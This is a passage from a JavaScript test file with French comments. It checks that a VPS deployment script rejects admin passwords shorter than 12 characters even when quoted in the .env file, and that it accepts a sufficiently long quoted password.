  await withTempDir(async (work) => {
    // "1234567890" = 10 caractères réels (ce que docker compose fixera dans le
    // conteneur, guillemets retirés) mais 12 caractères si on mesure la valeur
    // .env brute AVEC ses guillemets — exactement le cas qui contournait la garde.
    await setupMockVpsRepo(work, {
      envContent: 'PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD="1234567890"\n',
    });
    const res = runMockVpsScript(work);
    assert.notEqual(res.status, 0, "un mot de passe réellement < 12 caractères ne doit PAS passer, même entre guillemets");
    // Le message doit être le VRAI diagnostic (mot de passe trop court), pas
    // une erreur générique qui n'apparaîtrait que plus tard (healthcheck).
    assert.match(res.stderr, /trop court/);
    assert.doesNotMatch(res.stdout, /Vérification de santé/); // n'a jamais atteint l'étape 5/5
  });
});

test("DURCISSEMENT round 2 — deploy-vps.sh REFUSE aussi un mot de passe court entre GUILLEMETS SIMPLES", async () => {
  await withTempDir(async (work) => {
    await setupMockVpsRepo(work, {
      envContent: "PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD='1234567890'\n",
    });
    const res = runMockVpsScript(work);
    assert.notEqual(res.status, 0);
    assert.match(res.stderr, /trop court/);
  });
});

test("DURCISSEMENT round 2 — deploy-vps.sh ACCEPTE un mot de passe conforme même écrit entre guillemets (les guillemets ne sont pas comptés)", async () => {
  await withTempDir(async (work) => {
    await setupMockVpsRepo(work, {
      envContent: 'PILOTEO_ADMIN_USERNAME=admin\nPILOTEO_ADMIN_PASSWORD="un-mot-de-passe-suffisamment-long"\n',
    });
    const res = runMockVpsScript(work);
    assert.equal(res.status, 0, `deploy-vps.sh aurait dû réussir : stderr=${res.stderr}`);
  });
});
